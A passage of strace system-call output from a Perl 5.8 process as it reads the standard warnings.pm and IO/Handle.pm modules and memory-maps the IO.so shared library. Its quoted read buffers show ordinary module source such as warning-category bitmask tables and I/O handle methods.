\'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
9764  07:29:45.363160 brk(0x81b6000)    = 0x81b6000
9764  07:29:45.363177 brk(0x81b5000)    = 0x81b5000
9764  07:29:45.363255 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
9764  07:29:45.363737 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
9764  07:29:45.364483 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
9764  07:29:45.364613 read(8, "", 4096) = 0
9764  07:29:45.364626 close(8)          = 0
9764  07:29:45.364775 _llseek(6, 412, [412], SEEK_SET) = 0
9764  07:29:45.364791 _llseek(6, 0, [412], SEEK_CUR) = 0
9764  07:29:45.364802 close(6)          = 0
9764  07:29:45.364882 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
9764  07:29:45.364925 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
9764  07:29:45.364952 futex(0xb7f8f070, 0x81 /* FUTEX_??? */, 2147483647) = 0
9764  07:29:45.364967 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
9764  07:29:45.364981 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
9764  07:29:45.365072 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
9764  07:29:45.365097 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f93000
9764  07:29:45.365110 mmap2(0xb7f97000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f97000
9764  07:29:45.365124 close(6)          = 0
9764  07:29:45.365249 stat64("/etc/perl/IO/Handle.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.365265 stat64("/etc/perl/IO/Handle.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.365279 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.365292 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.365306 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.365318 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.365345 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.365384 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.365397 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.365426 stat64("/usr/share/perl5/IO/Handle.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.365440 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.365452 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
9764  07:29:45.365473 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
9764  07:29:45.365487 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3218) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.365498 _llseek(6, 0, [0], SEEK_CUR) = 0
9764  07:29:45.365515 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 